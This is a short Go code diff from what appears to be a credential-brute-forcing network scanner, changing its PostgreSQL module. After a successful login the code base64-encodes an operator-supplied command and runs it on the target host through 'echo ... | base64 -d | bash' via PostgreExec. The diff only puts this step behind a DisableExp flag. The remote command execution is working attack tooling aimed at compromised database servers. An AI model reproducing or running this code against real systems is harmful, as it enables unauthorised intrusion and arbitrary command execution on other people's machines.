@@ -52,11 +52,13 @@ func PostgresConn(info *common.HostInfo, user string, pass string) (flag bool, e
 				}
 				info.Queue.Push(vuln)
 			}
-			cmd := info.Command.TCPCommand
-			if cmd != "" {
-				b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
-				cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
-				PostgreExec(db, cmd)
+			if !info.DisableExp {
+				cmd := info.Command.TCPCommand
+				if cmd != "" {
+					b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
+					cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
+					PostgreExec(db, cmd)
+				}
 			}
 			flag = true
 		}
